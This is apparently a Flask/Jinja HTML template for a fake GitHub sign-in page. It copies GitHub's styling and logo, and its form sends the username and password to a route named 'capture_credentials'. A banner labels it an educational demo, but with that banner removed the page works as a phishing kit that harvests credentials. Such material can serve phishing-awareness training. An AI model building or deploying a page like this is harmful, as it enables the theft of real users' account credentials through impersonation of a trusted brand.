{% extends "base.html" %}

{% block title %}Sign in to GitHub{% endblock %}

{% block extra_css %}
<style>
body { background: #0d1117 !important; }
body::before, body::after { display: none; }
.gh-container { 
    max-width: 340px; 
    margin: 4rem auto; 
    padding: 20px; 
    background: #161b22; 
    border: 1px solid #30363d; 
    border-radius: 6px; 
}
.gh-logo { 
    text-align: center; 
    margin-bottom: 24px; 
}
.gh-logo svg { 
    fill: #fff; 
    width: 48px; 
    height: 48px; 
}
.gh-title { 
    color: #fff; 
    font-size: 24px; 
    font-weight: 300; 
    text-align: center; 
    margin-bottom: 16px; 
    letter-spacing: -0.5px; 
}
.gh-label { 
    color: #c9d1d9; 
    font-size: 14px; 
    font-weight: 400; 
    display: block; 
    margin-bottom: 8px; 
}
.gh-input { 
    width: 100%; 
    padding: 5px 12px; 
    margin-bottom: 16px; 
    background: #0d1117; 
    border: 1px solid #30363d; 
    border-radius: 6px; 
    color: #c9d1d9; 
    font-size: 14px; 
    line-height: 20px; 
}
.gh-input:focus { 
    outline: none; 
    border-color: #58a6ff; 
    box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3); 
}
.gh-btn { 
    width: 100%; 
    padding: 5px 16px; 
    background: #238636; 
    color: #fff; 
    border: 1px solid rgba(240, 246, 252, 0.1); 
    border-radius: 6px; 
    font-size: 14px; 
    font-weight: 500; 
    cursor: pointer; 
}
.gh-btn:hover { 
    background: #2ea043; 
}
.warning-banner { 
    background: #fff3cd; 
    padding: 1rem; 
    border-radius: 8px; 
    margin-bottom: 1rem; 
    text-align: center; 
    color: #856404; 
}
</style>
{% endblock %}

{% block content %}
<div class="warning-banner">⚠️ EDUCATIONAL DEMO - Fake GitHub Login</div>

<div class="gh-container">
    <div class="gh-logo">
        <svg height="48" viewBox="0 0 16 16" width="48">
            <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
        </svg>
    </div>
    <h1 class="gh-title">Sign in to GitHub</h1>
    
    <form method="POST" action="{{ url_for('capture_credentials') }}">
        <input type="hidden" name="platform" value="GitHub">
        <label class="gh-label">Username or email address</label>
        <input class="gh-input" type="text" name="username" autocomplete="username" required>
        <label class="gh-label">Password</label>
        <input class="gh-input" type="password" name="password" autocomplete="current-password" required>
        <button class="gh-btn" type="submit">Sign in</button>
    </form>
</div>
{% endblock %}
